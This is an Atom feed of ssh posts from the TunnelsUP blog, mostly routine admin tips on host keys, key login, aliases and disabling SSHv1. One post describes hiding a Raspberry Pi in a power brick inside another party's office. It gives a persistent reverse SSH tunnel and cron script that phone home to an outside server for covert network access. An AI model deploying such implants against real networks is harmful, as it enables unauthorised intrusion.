@@ -1,0 +1,369 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: ssh | TunnelsUP]]></title>
+  <link href="http://tunnelsup.github.io/tup/tag/ssh/atom.xml" rel="self"/>
+  <link href="http://tunnelsup.github.io/"/>
+  <updated>2016-09-29T22:17:21-07:00</updated>
+  <id>http://tunnelsup.github.io/</id>
+  <author>
+    <name><![CDATA[Jack]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[ssh Remote Host Identification Has Changed]]></title>
+    <link href="http://tunnelsup.github.io/ssh-remote-host-identification-has-changed/"/>
+    <updated>2015-02-28T20:41:00-08:00</updated>
+    <id>http://tunnelsup.github.io/ssh-remote-host-identification-has-changed</id>
+    <content type="html"><![CDATA[<p>Sometimes when you are trying to do ssh from a linux machine you may see this message:</p>
+
+<p><code>
+user@server:~$ ssh -l user 192.168.1.1
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+It is also possible that a host key has just been changed.
+The fingerprint for the RSA key sent by the remote host is
+7f:9a:dc:fd:c8:a2:0b:be:c7:b1:39:5c:fe:a6:a3:2d.
+Please contact your system administrator.
+Add correct host key in /Users/user/.ssh/known_hosts to get rid of this message.
+Offending RSA key in /Users/user/.ssh/known_hosts:5
+RSA host key for 192.168.1.1 has changed and you have requested strict checking.
+Host key verification failed.
+</code></p>
+
+<h2>Host key verification failed</h2>
+
+<p>When you see the message above it indicates that the ssh key found in your known_hosts file has a different key than the system you are trying to ssh into. This usually happens if the destination changes but the IP remains the same. For instance if this IP is a router on the network that you&rsquo;ve ssh&rsquo;d into before and the router gets replaced with a new one, the new router will have a different ssh key. The message indicates exactly which file and even what line the ssh key is located in.</p>
+
+<p>If you trust the destination you are trying to get to is the right one the best way to fix this is to go delete the offending ssh key.</p>
+
+<p>Use your favorite text editor such as vi or nano and edit the file. Here we&rsquo;ll use vi:<br>
+<code>vi /Users/user/.ssh/known_hosts</code></p>
+
+<p>The location of this file will be in the error message you received earlier.</p>
+
+<p>Then you can either search for the the IP of the system you&rsquo;re trying to ssh into like:<br>
+<code>/192.168.1.1</code></p>
+
+<p>Or go directly to the line that it indicated in the error message:<br>
+<code>:5</code></p>
+
+<p>The line should look something like this:</p>
+
+<p><code>
+192.168.1.1 ssh-rsa AAAAB3NzaC1yc2EAwgYKwAAqBe9mgpPGQDJRBEHv2mjuZn1e1v9GPKoNL+09zX0khWtayio5Oa6Y0BcTBeHBmCWMilqsrZIAvetB5nmcQeWkjX5fcgZsztl1ro3oenxQd0PQIO0WA6A79zsL36A25iwgVkFq2IFscYWoJ7b005ja6GJAAmjAANff8XFdgZR8+DP23EMTM11pIsK2w==
+</code></p>
+
+<p>Delete the line save and quit.<br>
+<code>dd</code><br>
+<code>wq</code></p>
+
+<p>Now try your ssh session again and you should no longer be getting the error.</p>
+
+<p>If there is a problem with a the <code>known_hosts</code> file getting screwed up it is safe to delete the <code>known_hosts</code> file entirely. It will also delete any of your saved ssh keys but you will simply be prompted to accept them next time you ssh to something.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SSH Without Password]]></title>
+    <link href="http://tunnelsup.github.io/ssh-without-password/"/>
+    <updated>2015-02-07T13:01:00-08:00</updated>
+    <id>http://tunnelsup.github.io/ssh-without-password</id>
+    <content type="html"><![CDATA[<p>It is possible to ssh from one Linux or Mac machine to another Linux server by using only cryptographic keys instead of using a password.</p>
+
+<h3>Create the private key on the source computer</h3>
+
+<p>On the source system <code>192.168.100.1</code> create the private key with the following command:</p>
+
+<p><code>bash
+cd ~/.ssh
+ssh-keygen -t rsa
+</code></p>
+
+<p>Choose no passphrase when asked and accept the default filename of id_rsa. This creates both the <code>id_rsa</code> private key file and a <code>id_rsa.pub</code> public key file. Keep the private key on the source system and copy the public key to the destination system.</p>
+
+<h3>Move the public key to the destination computer</h3>
+
+<p>Now we need the move that public key from the source computer to the destination.</p>
+
+<p>From the source <code>192.168.100.1</code> use the following command:</p>
+
+<p><code>bash
+scp id_rsa.pub &lt;user&gt;@&lt;yourhost&gt;:.ssh/authorized_keys
+</code></p>
+
+<p>This is the username you normally use to ssh into that system. So if your username was <code>darcy</code> and the destination IP is <code>192.168.200.1</code> then the command becomes:</p>
+
+<p><code>bash
+scp id_rsa.pub darcy@192.168.200.1:.ssh/authorized_keys
+</code></p>
+
+<p>Enter the password for that username and your done.</p>
+
+<h3>Testing</h3>
+
+<p>Congrats you&rsquo;ve set up the ssh keys so that you no longer need to use a password when ssh'ing into that system. To test this simply do ssh like normal and it should automatically connect you.</p>
+
+<p><code>ssh darcy@192.168.200.1</code></p>
+
+<h5>Add an alias</h5>
+
+<p>You can add an alias for this command to make it even quicker to get to that system. If you&rsquo;re using a bash shell simply add this to your .bashrc file on your source computer.</p>
+
+<p><code>bash
+alias s1='ssh darcy@192.168.200.1'
+</code></p>
+
+<p>Now you simply need to type <code>s1</code> and you&rsquo;ll automatically be logged into that system.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[How to SSH like a Pro]]></title>
+    <link href="http://tunnelsup.github.io/how-to-ssh-like-a-pro/"/>
+    <updated>2013-06-15T17:06:00-07:00</updated>
+    <id>http://tunnelsup.github.io/how-to-ssh-like-a-pro</id>
+    <content type="html"><![CDATA[<p>A few tips and tricks about sshing.</p>
+
+<p>Whatever network I&rsquo;m working in I have found it&rsquo;s common to have a central linux server that I ssh into and then I can jump off of that to any of the devices in the network. The reason for this is that it makes securing the network a lot easier when your VTY ACL consists of one IP even though you have many admins. There&rsquo;s also a trail of who was logged into what when. But by far my favorite reason for having a central server to jump off of is because I can greatly improve my performance because I can use the power of linux to make my life easier.</p>
+
+<p>If you haven&rsquo;t guessed by now, this post is very linux centric keeping in mind accessing networking devices like Cisco routers.</p>
+
+<h3>Aliases in .bashrc</h3>
+
+<p>Open up your .bashrc file (use vi or pico or something). Here is an example of what mine looks like:</p>
+
+<p><code>bash
+alias s='ssh'
+alias sc='ssh -l cisco'
+</code></p>
+
+<p>I like to think smarter whenever I can. By making <code>s</code> the alias for ssh it cuts down the amount of characters typed by 66%! So now whenver I need to ssh into a device I simply use <code>s</code> like so:<br>
+<code>s 192.168.1.1</code></p>
+
+<p>Also often I am finding myself using the same username like <code>cisco</code> for many things. If I know the username is <code>cisco</code> before trying to ssh to the device I now have a shortcut for that. To ssh into a system using that username I simply do:<br>
+<code>sc 192.168.1.1</code></p>
+
+<h3>Editing your .ssh/config file</h3>
+
+<p>By default your ssh username will be whatever you logged into linux with. So how do you change the default ssh username? That&rsquo;s simple. It&rsquo;s in the <code>.ssh/config</code> file.</p>
+
+<p>Edit the file:<br>
+<code>vi .ssh/config</code><br>
+Add the lines:<br>
+<code>Host *</code><br>
+<code>User myname.acs</code><br>
+Now change permissions of the file:<br>
+<code>chmod 600 .ssh/config</code></p>
+
+<p>Now simply try to ssh into any device and you&rsquo;ll see the username has changed to <code>myname.acs</code> by default.</p>
+
+<h4>Changing the username for a specific device or subnet</h4>
+
+<p>Let&rsquo;s say you have a bunch of devices in the 192.168.5.x network that all authenticate to the same username &lsquo;bob.acs&rsquo;. It&rsquo;s possible to configure ssh to lookup the place you&rsquo;re trying to go and tack on a username before trying to ssh. Here&rsquo;s how.</p>
+
+<p>Go back into editing the file:<br>
+<code>vi .ssh/config</code><br>
+Add the following lines at the top of the file:<br>
+<code>Host 192.168.5.*</code><br>
+<code>User newusername</code><br></p>
+
+<p>Now you&rsquo;ve just changed the default username for just devices starting with 192.168.5.x. This can also work for hostnames too.</p>
+
+<h3>Use keys to login instead of a password</h3>
+
+<p>If you&rsquo;re trying to ssh from one linux machine to another it&rsquo;s possible to use keys for authentication instead of a password. Follow this guide to <a href="/ssh-without-password">ssh without password</a>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Raspberry Pi: Phoning home using a reverse remote ssh tunnel]]></title>
+    <link href="http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/"/>
+    <updated>2013-05-08T00:00:00-07:00</updated>
+    <id>http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel</id>
+    <content type="html"><![CDATA[<p><img src="/images/pi6.jpg" alt="Pi IMG" /><br>
+What&rsquo;s this? Just an ordinary powerbrick? Read on to find out why this is an incredibly dangerous thing to see in your office.</p>
+
+<p>When I received my raspberry pi I immediately wanted to use it as a <del>hacking</del> remote tech support tool. The idea was to be able to plug it in somewhere and it be small enough that it&rsquo;s not noticed in someone&rsquo;s network. Then if I could access it remotely I am in their network and can do things.</p>
+
+<h2>Part 1: Setting up the Pi</h2>
+
+<p>The problem is that if I plug this in somewhere in the world and leave it I need it to phone home so I can gain remote connectivity to it. I know my home&rsquo;s IP but I don&rsquo;t know the Pi&rsquo;s IP. I want it to be a plug in and run away type of scenario and not one that I&rsquo;ll be hooking up any monitor or keyboard or anything.</p>
+
+<h3>Pre-configuration</h3>
+
+<p>Before beginning you need to have the following:</p>
+
+<ul>
+<li>Raspberry Pi with a Linux OS on it</li>
+<li>Raspberry Pi is configured to receive a DHCP address</li>
+<li>Raspberry Pi is configured to receive ssh connections</li>
+<li>A seperate linux server that is reachable by ssh from the internet. This server should have a static public IP.</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>It should be easy enough to figure out how to complete these on your own. With the above, you should be able ssh to the Pi remotely if you know its IP. Well you don&rsquo;t know its IP and even if you did it is probably behind a firewall which makes it impossible to get to. Or so you think.</p>
+
+<p>What you&rsquo;ll need is a linux server that has a persistent IP. One that you can ssh into from anywhere in the world. Suppose it&rsquo;s IP is 25.25.25.25. Even though my home network gets a dynamic IP from my ISP it usually stays the same for weeks and even years. All I&rsquo;ve done is forwarded port 22 through the firewall to a linux server to make this work.</p>
+
+<h3>Setting up the ssh certificate on the Pi</h3>
+
+<p>From the Raspberry Pi you should be able to ssh to this linux server. Test it to be sure. So now you want to set it up so the authentication is certificate based (this way the Pi can be set up to auto ssh into the server without being prompted for a password).</p>
+
+<p>Follow this guide for setting up <a href="/ssh-without-password/">automatic ssh login using ssh keys</a>.</p>
+
+<h3>Creating the Reverse SSH tunnel</h3>
+
+<p>Now comes the fun part. Create a reverse remote ssh tunnel to that host to forward connections back to the Pi. Confused? Here look at this command you would issue from the Pi:</p>
+
+<p><code>
+ssh -N -R 2222:localhost:22 serverUser@25.25.25.25
+</code></p>
+
+<p>The Pi is ssh'ing to the server at 25.25.25.25 using the username &ldquo;serverUser&rdquo;. Upon doing so, it&rsquo;s telling that server to open port 2222. Any connections coming into the server on port 2222 forward them over the tunnel back to the Pi on port 22. The -N tag is saying we don&rsquo;t need to actually send any ssh commands once connected.</p>
+
+<p>Once the Pi sets up that remote tunnel; from the server it connected to you can do this:</p>
+
+<p><code>
+ssh -l piUser -p 2222 localhost
+</code></p>
+
+<p>Now you should be ssh&rsquo;d into the Pi using port 2222 on the linux server! Awesome!</p>
+
+<p>Why did this work? The linux server is listening on port 2222 for incoming ssh connections. If it receives one, it will forward all traffic it receives into the previous ssh connection that was established already. That is essentially what the remote tunnel does.</p>
+
+<h3>Making it persistent (always on)</h3>
+
+<p>Next is to make this a persistent thing. You want the Pi to keep trying to build this ssh tunnel always and if it goes down try to bring it back. We&rsquo;ll do this using a bash script and cron job.</p>
+
+<p>Create a file on the Pi called ~/create_ssh_tunnel.sh and put this in it:</p>
+
+<p>``` bash</p>
+
+<h1>!/bin/bash</h1>
+
+<p>createTunnel() {
+  /usr/bin/ssh -N -R 2222:localhost:22 <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#115;&#101;&#114;&#x76;&#x65;&#114;&#85;&#x73;&#101;&#114;&#x40;&#50;&#53;&#x2e;&#50;&#x35;&#46;&#x32;&#53;&#46;&#50;&#x35;">&#115;&#101;&#x72;&#x76;&#x65;&#114;&#x55;&#x73;&#101;&#x72;&#x40;&#x32;&#x35;&#46;&#x32;&#x35;&#x2e;&#50;&#x35;&#46;&#50;&#53;</a>
+  if [[ $? -eq 0 ]]; then</p>
+
+<pre><code>echo Tunnel to jumpbox created successfully
+</code></pre>
+
+<p>  else</p>
+
+<pre><code>echo An error occurred creating a tunnel to jumpbox. RC was $?
+</code></pre>
+
+<p>  fi
+}
+/bin/pidof ssh
+if [[ $? -ne 0 ]]; then
+  echo Creating new tunnel connection
+  createTunnel
+fi
+```</p>
+
+<p>What this program is doing is checking to see if there&rsquo;s a process running called &lsquo;ssh&rsquo;. If there isn&rsquo;t then start the ssh tunnel.</p>
+
+<p>Next make it executable by doing the following:</p>
+
+<p><code>
+chmod 700 ~/create_ssh_tunnel.sh
+</code></p>
+
+<p>Now start the crontab.</p>
+
+<p><code>
+crontab -e
+</code>
+Place this in as your cron job (every minute check if the ssh connection is up, if not, attempt to bring it up)</p>
+
+<p><code>
+*/1 * * * * ~/create_ssh_tunnel.sh &gt; tunnel.log 2&gt;&amp;1
+</code>
+To troubleshoot any problems in this you can view the tunnel.log file.</p>
+
+<p>Now let&rsquo;s take a step back and look at what we&rsquo;ve done. When the Raspberri Pi is on, it will check every minute to see if an ssh connection to your linux server exists. If it doesn&rsquo;t it will create one. The tunnel it creates is really a reverse remote tunnel. Once the tunnel is up, anyone who ssh&rsquo;s into port 2222 of the linux server will then be redirected to the Pi. Incredible!</p>
+
+<h2>Part 2: Concealing the Pi</h2>
+
+<p>I found an old powerbrick for a laptop and gutted it.<br>
+<img src="/images/pi2.jpg" alt="Pi IMG" /></p>
+
+<p>The raspberry pi almost fit. I had to solder off the S-Video port to get it to fit just right.<br>
+<img src="/images/pi3.jpg" alt="Pi IMG" /></p>
+
+<p>Then I had to hook power up to it. In order to do this I simply took apart a USB charger. Took the plastic casing off to save space and cut the cord to save even more space. Then I soldered where the powerbrick power feed is into the USB power feed. This way when I power up the brick, it&rsquo;ll give power to the USB charger which will in turn power the Pi.<br>
+<img src="/images/pi4.jpg" alt="Pi IMG" /></p>
+
+<p>Lastly was finding a black ethernet cable so both cables coming out of the power brick are black and look inconspicuous.<br>
+<img src="/images/pi5.jpg" alt="Pi IMG" /></p>
+
+<p>Here are pictures of it in its special case:<br>
+<img src="/images/pi6.jpg" alt="Pi IMG" /><br>
+<img src="/images/pi7.jpg" alt="Pi IMG" /></p>
+
+<h2>Part 3: Testing it</h2>
+
+<p>Check it out! <br>
+<img src="/images/pi1.jpg" alt="Pi IMG" /></p>
+
+<p>I have this plugged into an office somewhere. It looks weird when you stare at it but put it behind a plant and nobody will ever notice it (except the guy who waters the plants).</p>
+
+<p>Once I plugged it in I went back home. Right after the Pi got an IP address it created a tunnel to my home server. When I tried ssh'ing into port 2222 of my home server I was redirected to the Pi. Now I am on a computer in someone elses network. Woohoo! Now I can do remote tech support more effectively.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Cisco IPS - Turning off ssh version 1]]></title>
+    <link href="http://tunnelsup.github.io/cisco-ips-turning-off-ssh-version-1/"/>
+    <updated>2013-04-01T00:00:00-07:00</updated>
+    <id>http://tunnelsup.github.io/cisco-ips-turning-off-ssh-version-1</id>
+    <content type="html"><![CDATA[<p>Vulnerability scanners are reporting that ssh version 1 is on by default for Cisco IPS units. It is fairly simple to turn this off on the IPS if you have service level privilege.</p>
+
+<p>First get into the service level account. This is essentially the linux shell under the IPS.</p>
+
+<p><code>ssh service@x.x.x.x</code></p>
+
+<p>Once you are ssh&rsquo;d in, issue these commands.</p>
+
+<p><code>
+su
+vi /etc/ssh/sshd_config
+</code></p>
+
+<p>Change the line that says:</p>
+
+<p><code>#Protocol 2,1</code></p>
+
+<p>Uncomment it and take out the &lsquo;,1&rsquo; so it looks like this:</p>
+
+<p><code>Protocol 2</code></p>
+
+<p>Save the file and exit out of vi.</p>
+
+<p>Restart the ssh daemon. (Warning: This may cause a failover if these are IPSMs in a failover pair)</p>
+
+<p><code>/etc/init.d/S60ssh restart</code></p>
+
+<p>Now you can test ssh'ing into your device and you should see this error:</p>
+
+<p><code>
+[user@linuxbox1 ~]$ ssh 10.50.50.10 -1
+Protocol major versions differ: 1 vs. 2
+</code></p>
+
+<p>Voila, ssh version 1 is now disabled!</p>
+]]></content>
+  </entry>
+  
+</feed>
